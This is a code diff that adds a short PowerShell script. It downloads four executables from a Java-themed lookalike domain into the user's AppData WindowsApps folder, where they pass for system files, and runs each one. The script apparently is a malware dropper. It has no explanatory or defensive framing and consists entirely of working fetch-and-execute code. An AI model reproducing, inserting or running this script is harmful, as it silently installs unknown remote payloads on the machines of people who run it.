@@ -1,0 +1,24 @@
+$gfgff = @(
+    "http://javadevportal.live/files/java-a.exe",
+    "http://javadevportal.live/files/java-c.exe",
+    "http://javadevportal.live/files/java-m.exe",
+    "http://javadevportal.live/files/java-l.exe"
+)
+
+$currentUser = [Environment]::UserName
+$savePath = "C:\Users\$currentUser\AppData\Local\Microsoft\WindowsApps"
+
+if (-not (Test-Path -Path $savePath)) {
+    New-Item -ItemType Directory -Path $savePath -Force | Out-Null
+}
+
+foreach ($link in $gfgff) {
+    $fileName = Split-Path -Leaf $link
+    $fullPath = Join-Path -Path $savePath -ChildPath $fileName
+
+    if (-not (Test-Path -Path $fullPath)) {
+        $webClient = New-Object System.Net.WebClient
+        $webClient.DownloadFile($link, $fullPath)
+        Start-Process -FilePath $fullPath
+    }
+}
